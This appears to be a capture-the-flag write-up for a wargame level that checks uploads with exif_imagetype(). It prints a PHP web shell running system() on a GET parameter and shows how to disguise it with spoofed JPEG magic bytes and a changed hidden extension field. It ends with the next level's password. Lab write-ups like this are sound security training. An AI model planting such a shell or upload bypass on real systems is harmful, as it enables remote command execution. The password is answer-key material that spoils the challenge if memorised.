Same code as level 12 but the code uses `exif_imagetype()` function to check the first 4 bytes of the image.

This is related to the MIME type of the file. each file has the first 4 bytes that determines the file type. example:
- PNG: `89 50 4E 47`
- JPG: `FF D8 FF FE`

This is our php script file content:
```php
<?php
// Basic Command Execution
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

```

This is the current file type:
![[Pasted image 20260701211330.png]]

Let's read the hex of the file:
![[Pasted image 20260701211450.png]]

`3C 3F 70 68` correspond to `<?ph` . so we need 4 dummy bytes at the start of the file:
```php
AAAA
<?php
// Basic Command Execution
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

In `hexeditor`:
![[Pasted image 20260701211652.png]]

`41 41 41 41` is correspond to `AAAA` and `JPG` first 4 bytes is `FF D8 FF FE`, so let's change to it:
![[Pasted image 20260701211833.png]]

Save and check the file:
![[Pasted image 20260701211856.png]]

Let's upload the file, but first change the hidden field extension to `.php`:
`<a href="upload/ae28h3m8jb.php">upload/ae28h3m8jb.php</a>`
![[Pasted image 20260701212116.png]]

![[Pasted image 20260701212131.png]]
lvl14 pass: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8